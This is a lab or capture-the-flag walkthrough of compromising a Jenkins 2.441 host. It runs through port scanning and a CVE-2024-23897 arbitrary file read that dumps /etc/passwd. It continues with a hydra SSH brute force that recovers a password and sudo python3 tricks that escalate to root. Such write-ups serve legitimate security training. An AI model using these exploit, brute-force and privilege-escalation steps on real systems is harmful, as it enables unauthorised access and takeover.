# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.040 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.052 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1008ms
rtt min/avg/max/mdev = 0.040/0.046/0.052/0.006 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 10:12 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 56:03:FE:DC:35:32 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```
``` bash
sudo nmap -p22,8080 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 10:12 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000022s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 94:fb:28:59:7f:ae:02:c0:56:46:07:33:8c:ac:52:85 (ECDSA)
|_  256 43:07:50:30:bb:28:b0:73:9b:7c:0c:4e:3f:c9:bf:02 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.18)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 56:03:FE:DC:35:32 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```
# Web enumeration
## Robots txt
``` bash
curl http://172.17.0.2:8080/robots.txt
# we don't want robots to click "build" links
User-agent: *
Disallow: /
```
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2:8080 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt --xl 0
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login                (Status: 200) [Size: 1737]
main                 (Status: 500) [Size: 8379]
index                (Status: 200) [Size: 13627]
log                  (Status: 403) [Size: 595]
me                   (Status: 403) [Size: 593]
404                  (Status: 200) [Size: 8341]
script               (Status: 403) [Size: 601]
robots.txt           (Status: 200) [Size: 71]
error                (Status: 400) [Size: 8114]
gc                   (Status: 405) [Size: 8500]
eval                 (Status: 405) [Size: 8504]
exit                 (Status: 405) [Size: 8504]
configure            (Status: 403) [Size: 628]
cloud                (Status: 403) [Size: 599]
builds               (Status: 200) [Size: 35021]
oops                 (Status: 200) [Size: 8343]
reload               (Status: 405) [Size: 8508]
exception            (Status: 500) [Size: 8384]
```
## Tech used
``` bash
whatweb http://172.17.0.2:8080
http://172.17.0.2:8080 [403 Forbidden] Cookies[JSESSIONID.a5cec9eb], Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.a5cec9eb], IP[172.17.0.2], Jenkins[2.441], Jetty[10.0.18], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://172.17.0.2:8080/login?from=%2F [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.18)], IP[172.17.0.2], Jenkins[2.441], Jetty[10.0.18], PasswordField[j_password], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session], X-Frame-Options[sameorigin]
```
## CVE
Investigating vulnerabilities for jenkins 2.441 found a critical vuln
*CVE-2024-23897 (Arbitrary File Read)*
## Exploit
Using [CVE-2024-23897 PoC](https://github.com/Maalfer/CVE-2024-23897) from Maalfer
``` bash
python3 CVE-2024-23897.py 172.17.0.2 8080 /etc/passwd
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin: No such agent "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin" exists.
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin: No such agent "systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin" exists.
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin: No such agent "messagebus:x:100:102::/nonexistent:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin: No such agent "sshd:x:101:65534::/run/sshd:/usr/sbin/nologin" exists.
bobby:x:1001:1001::/home/bobby:/bin/bash: No such agent "bobby:x:1001:1001::/home/bobby:/bin/bash" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
pinguinito:x:1002:1002::/home/pinguinito:/bin/bash: No such agent "pinguinito:x:1002:1002::/home/pinguinito:/bin/bash" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
Error al intentar conectar el nodo: Command 'java -jar jenkins-cli.jar -s http://172.17.0.2:8080/ -http connect-node @/etc/passwd' returned non-zero exit status 5.
```
# SSH
## Brute force with hydra
``` bash
cat > users.txt << EOF
heredoc> bobby
heredoc> pinguinito
heredoc> root
heredoc> jenkins
heredoc> EOF
```
``` bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -u -F -t 64
[22][ssh] host: 172.17.0.2   login: bobby   password: chocolate
```
``` bash
ssh bobby@172.17.0.2
```
# Privilege escalation
## Lateral movement: bobby -> pinguinito
```bash
sudo -l
(pinguinito) NOPASSWD: /usr/bin/python3
```
``` bash
sudo -u pinguinito /usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash")'
```
## Lateral movement: pinguinito -> root
``` bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```
``` bash
mv /opt/script.py /opt/script.py.bak
echo 'import os; os.execl("/bin/bash", "bash")' > /opt/script.py
sudo -u root /usr/bin/python3 /opt/script.py
```
# Root
``` bash
whoami
root
```
